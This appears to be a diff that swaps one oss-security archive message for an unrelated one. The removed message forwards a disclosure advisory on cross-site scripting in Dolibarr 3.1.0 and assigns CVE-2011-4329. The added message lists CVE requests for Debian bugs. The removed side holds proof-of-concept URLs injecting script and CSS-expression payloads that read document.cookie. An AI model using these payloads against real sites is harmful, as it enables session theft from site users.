@@ -1,88 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/21/13
-Message-ID: <CABqVa38w6JFrG7RjzFMkYLcZnG9f699-Cwt_bM1JAYHmOZN4VQ@mail.gmail.com>
-Date: Mon, 21 Nov 2011 09:12:43 -0700
-From: Kurt Seifried <kurt@...fried.org>
-To: oss-security@...ts.openwall.com
-Subject: Fwd: Fwd: Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/14/1
+Message-ID: <20110114170158.GB3381@pisco.westfalen.local>
+Date: Fri, 14 Jan 2011 18:01:58 +0100
+From: Moritz Mühlenhoff <jmm@...til.org>
+To: oss-security@...ts.openwall.com, coley@...re.org
+Subject: Re: CVE requests: ftpls, xdigger, lbreakout2, calibre, typo3
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Nov 21, 2011 at 2:29 AM, Henri Salo <henri@...v.fi> wrote:
-> Can I get CVE-identifier for this issue, thank you? I verified from infoserve.de that they haven't already requested one.
->
-> Best regards,
-> Henri Salo
->
-> ----- Forwarded message from security@...oserve.de -----
->
-> Date: Wed, 9 Nov 2011 09:59:18 GMT
-> From: security@...oserve.de
-> To: bugtraq@...urityfocus.com
-> Subject: Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
-> X-Mailer: MIME-tools 5.420 (Entity 5.420)
->
-> Advisory:               Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
-> Advisory ID:            INFOSERVE-ADV2011-03
-> Author:                 Stefan Schurtz
-> Contact:                security@...oserve.de
-> Affected Software:      Successfully tested on Dolibarr 3.1.0 other versions may also be affected
-> Vendor URL:             http://www.dolibarr.org/
-> Vendor Status:          fixed in the 3.1 branch
->
-> ==========================
-> Vulnerability Description
-> ==========================
->
-> Dolibarr 3.1.0 is prone to multiple XSS vulnerability
->
-> ==================
-> PoC-Exploit
-> ==================
->
-> Cross-Site-Scripting - parameter 'username'
->
-> http://<target>/admin/company.php?mainmenu=home&leftmenu=setup&username='"</script><script>alert(document.cookie)</script>
-> http://<target>/admin/company.php?mainmenu=home&leftmenu=setup&username='"</script><script>alert(document.cookie)</script>&=3&optioncss=print
->
-> IE-only
->
-> http://<target>/admin/security_other.php/" stYle="x:expre/**/ssion(alert(document.cookie))
-> http://<target>/admin/events.php/" stYle="x:expre/**/ssion(alert(document.cookie))
-> http://<target>/admin/user.php/" stYle="x:expre/**/ssion(alert(document.cookie))
->
-> =========
-> Solution:
-> =========
->
-> Fixed in the 3.1 branch
->
-> ====================
-> Disclosure Timeline:
-> ====================
->
-> 08-Nov-2011 - vendor informed
-> 09-Nov-2011 - vendor fix in the 3.1 branch
->
-> ========
-> Credits:
-> ========
->
-> Vulnerabilities found and advisory written by INFOSERVE Security Team
->
-> ===========
-> References:
-> ===========
->
-> https://doliforge.org/tracker/?func=detail&aid=232&group_id=144
-> https://github.com/Dolibarr/dolibarr/commit/762f98ab4137749d0993612b4e3544a4207e78a1
-> http://www.dolibarr.org/
-> http://www.infoserve.de/
->
-> ----- End forwarded message -----
->
+On Wed, Jan 12, 2011 at 10:48:06PM -0600, Raphael Geissert wrote:
+> Hi,
+> 
+> Could CVE ids be assigned for the following issues? Thanks in advance.
+> 
+> There are more issues without ids, will request them later.
 
-Please use CVE-2011-4329 for this issue.
+We're still missing CVE assignments for several issues from 2009.
+These have been requested on oss-security before, but couldn't be 
+processed by Josh/Red Hat, since RH doesn't have 2009 IDs. As such, 
+they need to be handled by MITRE:
 
--- 
-Kurt Seifried
-kurt@...fried.org
+1. Overkill (this should be a CVE-2009 ID)
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=549310
+
+2. Emacs mode for reStructuredText (from DocUtils) (this should be a CVE-2009 ID)
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=560755
+
+3. FireGPG (this should be a CVE-2008 ID)
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=514386
+http://securityvulns.com/Udocument757.html
+
+4. Burn (Homepage: http://www.bigpaul.org/burn/) (That's a CVE-2009 ID)
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=542329
+
+5. pdfroff (from GNU groff) (That's a CVE-2009 ID)
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=538330
+http://cvsweb.openwall.com/cgi/cvsweb.cgi/Owl/packages/groff/groff-1.20.1-owl-tmp.diff
+
+6. Jetty (That's a CVE-2009 ID)
+http://www.ush.it/team/ush/hack-jetty6x7x/jetty-adv.txt
+
+7. Konversation (That's a CVE-2009 ID)
+http://bugs.kde.org/show_bug.cgi?id=219985
+
+Cheers,
+        Moritz
+
+
